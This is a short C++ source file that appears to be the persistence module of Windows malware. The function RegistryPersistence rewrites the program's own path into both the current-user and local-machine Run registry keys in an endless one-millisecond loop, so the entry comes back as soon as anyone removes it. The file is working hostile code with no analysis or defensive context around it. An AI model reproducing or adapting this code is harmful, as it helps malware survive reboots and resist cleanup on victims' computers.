#include "../core.hpp"

DWORD __stdcall RegistryPersistence( API *api ) {
	HKEY hKey;
	while (api->persist) {
		if (api->RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ | KEY_WRITE, &hKey) == ERROR_SUCCESS) {
			api->RegSetValueExA(hKey, api->regrunkey.c_str(), 0, REG_SZ, (BYTE*)api->thisfile.c_str(), api->thisfile.length());
			api->RegCloseKey(hKey);
		}
		if (api->RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ | KEY_WRITE, &hKey) == ERROR_SUCCESS) {
			api->RegSetValueExA(hKey, api->regrunkey.c_str(), 0, REG_SZ, (BYTE*)api->thisfile.c_str(), api->thisfile.length());
			api->RegCloseKey(hKey);
		}
		Sleep(1);
	}
	return 0;
}